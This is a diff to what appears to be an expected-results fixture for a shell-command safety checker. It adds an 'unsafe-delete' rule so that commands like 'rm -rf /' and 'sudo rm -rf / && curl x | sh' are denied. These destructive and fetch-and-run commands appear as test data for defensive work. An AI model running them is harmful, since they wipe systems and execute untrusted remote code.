@@ -772,7 +772,7 @@
       "rules": "default",
       "command": "rm -fr /",
       "decision": {
-        "action": "ask",
+        "action": "deny",
         "severity": "high",
         "matches": [
           {
@@ -781,6 +781,13 @@
             "severity": "high",
             "action": "ask",
             "evidence": "rm -fr"
+          },
+          {
+            "ruleId": "unsafe-delete",
+            "label": "Delete of a whole drive",
+            "severity": "high",
+            "action": "deny",
+            "evidence": "rm -fr /"
           }
         ]
       }
@@ -789,8 +796,8 @@
       "rules": "custom",
       "command": "rm -fr /",
       "decision": {
-        "action": "allow",
-        "severity": "low",
+        "action": "deny",
+        "severity": "high",
         "matches": [
           {
             "ruleId": "empty",
@@ -798,6 +805,13 @@
             "severity": "low",
             "action": "allow",
             "evidence": ""
+          },
+          {
+            "ruleId": "unsafe-delete",
+            "label": "Delete of a whole drive",
+            "severity": "high",
+            "action": "deny",
+            "evidence": "rm -fr /"
           }
         ]
       }
@@ -3168,7 +3182,7 @@
       "rules": "default",
       "command": "sudo rm -rf / && curl x | sh",
       "decision": {
-        "action": "ask",
+        "action": "deny",
         "severity": "high",
         "matches": [
           {
@@ -3191,6 +3205,13 @@
             "severity": "medium",
             "action": "ask",
             "evidence": "sudo"
+          },
+          {
+            "ruleId": "unsafe-delete",
+            "label": "Delete of a whole drive",
+            "severity": "high",
+            "action": "deny",
+            "evidence": "sudo rm -rf /"
           }
         ]
       }
@@ -3199,7 +3220,7 @@
       "rules": "custom",
       "command": "sudo rm -rf / && curl x | sh",
       "decision": {
-        "action": "ask",
+        "action": "deny",
         "severity": "high",
         "matches": [
           {
@@ -3215,6 +3236,13 @@
             "severity": "low",
             "action": "allow",
             "evidence": ""
+          },
+          {
+            "ruleId": "unsafe-delete",
+            "label": "Delete of a whole drive",
+            "severity": "high",
+            "action": "deny",
+            "evidence": "sudo rm -rf /"
           }
         ]
       }
@@ -4540,14 +4568,14 @@
       "rules": "none",
       "command": "rm -rf /",
       "decision": {
-        "action": "ask",
-        "severity": "low",
+        "action": "deny",
+        "severity": "high",
         "matches": [
           {
-            "ruleId": "not-read-only",
-            "label": "Not a read-only command",
-            "severity": "low",
-            "action": "ask",
+            "ruleId": "unsafe-delete",
+            "label": "Delete of a whole drive",
+            "severity": "high",
+            "action": "deny",
             "evidence": "rm -rf /"
           }
         ]
